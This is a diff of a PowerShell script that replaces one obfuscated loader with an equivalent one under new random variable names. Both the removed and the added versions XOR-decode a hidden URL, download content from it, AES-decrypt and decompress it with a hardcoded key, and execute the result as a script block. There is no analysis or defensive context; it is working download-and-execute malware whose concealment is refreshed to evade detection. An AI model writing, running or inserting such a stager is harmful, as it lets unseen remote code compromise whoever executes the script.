@@ -1,28 +1,28 @@
-${x415d9b08} = @(
-    'CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTwkNEAxPAlhTVQZVUwVYV1VV'
-    'UVVSVgQEWVUDVVUGUlRWAVJRA1kDWARRAgRZBVAGVAFZBAZVWAFSUlBSUgQEBlcG'
-    'BFMEBg=='
+${xa0ac5d8d} = @(
+    'CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTwkNEAxPAQECUFRXWFABVFhT'
+    'AlUBUldXAlgEUgMGUQMBAwVXBQMGWVADBQZQWVhTAlVWVwNUUQMFBlZVU1UCVFUC'
+    'AVRWVQ=='
 ) -join ''
-${x5d35c95f} = [byte[]]([Convert]::FromBase64String(${x415d9b08}) | ForEach-Object { $_ -bxor 96 })
-${x415d9b08} = [System.Text.Encoding]::UTF8.GetString(${x5d35c95f})
-${x257e03ac} = [byte[]](@(
-    'jKhpzrgyO0Y='
-    'SUDIiQRO0gc='
-    'sik09hxS/Ow='
-    '0wScBq23NuU='
+${xad51e18a} = [byte[]]([Convert]::FromBase64String(${xa0ac5d8d}) | ForEach-Object { $_ -bxor 96 })
+${xa0ac5d8d} = [System.Text.Encoding]::UTF8.GetString(${xad51e18a})
+${x06f23a2b} = [byte[]](@(
+    '91q43eIcopM='
+    'pETBS/qTcjc='
+    'DT+VIeDcEaw='
+    'lFdO4LxTWAg='
 ) | ForEach-Object { [Convert]::FromBase64String($_) } | ForEach-Object { $_ -bxor 96 })
-${xcbcffaf8} = (Invoke-WebRequest -Uri ${x415d9b08} -UseBasicParsing).Content
-if (${xcbcffaf8} -is [byte[]]) { ${xcbcffaf8} = [System.Text.Encoding]::ASCII.GetString(${xcbcffaf8}) }
-${x4eb05cb6} = [Convert]::FromBase64String((${xcbcffaf8} -replace '[^A-Za-z0-9+/=]', ''))
-${x97381272} = [System.Security.Cryptography.Aes]::Create()
-${x97381272}.Key = ${x257e03ac}
-${x97381272}.IV = ${x4eb05cb6}[0..15]
-${xe2df6253} = New-Object System.IO.MemoryStream
-${xe2df6253}.Write(${x4eb05cb6}, 16, ${x4eb05cb6}.Length - 16)
-${xe2df6253}.Position = 0
-${xf25fa47b} = New-Object System.Security.Cryptography.CryptoStream(${xe2df6253}, ${x97381272}.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
-${xb78bf1d2} = New-Object System.IO.Compression.GZipStream(${xf25fa47b}, [System.IO.Compression.CompressionMode]::Decompress)
-${x00b6e251} = New-Object System.IO.StreamReader(${xb78bf1d2}, [System.Text.Encoding]::UTF8)
-${x2d5adef7} = ${x00b6e251}.ReadToEnd()
-${x00b6e251}.Dispose(); ${xb78bf1d2}.Dispose(); ${xf25fa47b}.Dispose(); ${xe2df6253}.Dispose(); ${x97381272}.Dispose()
-. ([scriptblock]::Create(${x2d5adef7}))
+${xc55cf842} = (Invoke-WebRequest -Uri ${xa0ac5d8d} -UseBasicParsing).Content
+if (${xc55cf842} -is [byte[]]) { ${xc55cf842} = [System.Text.Encoding]::ASCII.GetString(${xc55cf842}) }
+${xa3483789} = [Convert]::FromBase64String((${xc55cf842} -replace '[^A-Za-z0-9+/=]', ''))
+${xdaa9de2c} = [System.Security.Cryptography.Aes]::Create()
+${xdaa9de2c}.Key = ${x06f23a2b}
+${xdaa9de2c}.IV = ${xa3483789}[0..15]
+${x4aabc6b9} = New-Object System.IO.MemoryStream
+${x4aabc6b9}.Write(${xa3483789}, 16, ${xa3483789}.Length - 16)
+${x4aabc6b9}.Position = 0
+${x328059e9} = New-Object System.Security.Cryptography.CryptoStream(${x4aabc6b9}, ${xdaa9de2c}.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
+${xe4def4df} = New-Object System.IO.Compression.GZipStream(${x328059e9}, [System.IO.Compression.CompressionMode]::Decompress)
+${x7c6ac906} = New-Object System.IO.StreamReader(${xe4def4df}, [System.Text.Encoding]::UTF8)
+${x76d7c030} = ${x7c6ac906}.ReadToEnd()
+${x7c6ac906}.Dispose(); ${xe4def4df}.Dispose(); ${x328059e9}.Dispose(); ${x4aabc6b9}.Dispose(); ${xdaa9de2c}.Dispose()
+. ([scriptblock]::Create(${x76d7c030}))
